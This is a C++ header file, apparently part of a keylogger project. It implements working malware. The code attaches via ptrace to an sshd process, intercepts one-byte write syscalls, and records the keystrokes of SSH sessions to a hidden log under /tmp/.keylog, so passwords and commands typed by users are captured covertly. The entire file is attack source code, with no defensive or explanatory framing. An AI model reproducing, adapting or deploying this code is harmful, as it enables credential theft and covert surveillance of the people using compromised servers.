#ifndef KEYLOGGER_PTRACE_HPP
#define KEYLOGGER_PTRACE_HPP

#include <sys/user.h>
#include <sys/ptrace.h>
#include <wait.h>
#include <sys/syscall.h>
#include <boost/filesystem/path.hpp>

#include "dbg.h"

namespace fs = boost::filesystem;

namespace ptrace_ns{
    int read_addr_into_buff(const pid_t pid, const unsigned long long addr, char *buff, unsigned int buff_size){
        unsigned int bytes_read = 0;
        long * read_addr = (long *) addr;
        long * copy_addr = (long *) buff;
        unsigned long ret;
        memset(buff, 0, buff_size);
        do{
            ret = ptrace(PTRACE_PEEKTEXT, pid, (read_addr++), NULL);
            *(copy_addr++) = ret;
            bytes_read += sizeof(long);
        } while (ret && bytes_read < (buff_size - sizeof(long)));
        return bytes_read;
    }

    void ptrace_loop(const uint16_t& _pid){
        int status;
        pid_t pid = _pid;

        fs::path log_filename = "/tmp/.keylog";
        log_filename /= std::to_string(pid) + "_sshd.log";
        FILE *fd = std::fopen(log_filename.c_str(), "a+");
        if(!fd){
            std::cout << "Log-file error: " << log_filename << std::endl;
            return;
        }
        std::cout << "[PTRACE] Starting attach pid: " << pid << std::endl;
        if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) return;
        if(waitpid(pid, &status, 0) == -1 ) return;

        struct user_regs_struct state{};
        ptrace(PTRACE_GETREGS, pid, 0, &state);
        ptrace(PTRACE_SYSCALL, pid, 0, 0);

        char str[1000];
        int flag = 1;
        while(true){
            waitpid(pid, &status, 0);
            if(WIFEXITED(status)) break;
            ptrace(PTRACE_GETREGS, pid, 0, &state);
            if(state.orig_rax == SYS_write  && flag && state.rdx == 1){
                read_addr_into_buff(pid, state.rsi, str, 1000);
                if(str[0] == 0x20) {
                    dbg(str[0]);
                    std::string s = "[SPACE]";
                    std::cout << "DATA: " << s << std::endl;
                    std::fwrite(s.data(), 1, s.size(), fd);
                }
                else if(str[0] == 0x7F) {
                    dbg(str[0]);
                    std::string s = "[BACKSPACE]";
                    std::cout << "DATA: " << s << std::endl;
                    std::fwrite(s.data(), 1, s.size(), fd);
                }
                else if(str[0] == 0x03) {
                    dbg(str[0]);
                    std::string s = "[Ctrl+C]";
                    std::cout << "DATA: " << s << std::endl;
                    std::fwrite(s.data(), 1, s.size(), fd);
                }
                else if(str[0] == 0x04) {
                    dbg(str[0]);
                    std::string s = "[Ctrl+D]";
                    std::cout << "DATA: " << s << std::endl;
                    std::fwrite(s.data(), 1, s.size(), fd);
                }
                else if(str[0] == 0x0D) {
                    dbg(str[0]);
                    std::string s = "[ENTER]\n";
                    std::cout << "DATA: " << s << std::endl;
                    std::fwrite(s.data(), 1, s.size(), fd);
                }
                else {
                    dbg(str[0]);
                    printf("DATA: %c \n", str[0]);
                    std::fwrite(str, 1, 1, fd);
                }
            }
            flag = !flag;
            ptrace(PTRACE_SYSCALL, pid, 0, 0);
        }
        std::cout << "CLOSE_PTRACING!!!!" << std::endl;
        std::fclose(fd);
    }
}

#endif //KEYLOGGER_PTRACE_HPP
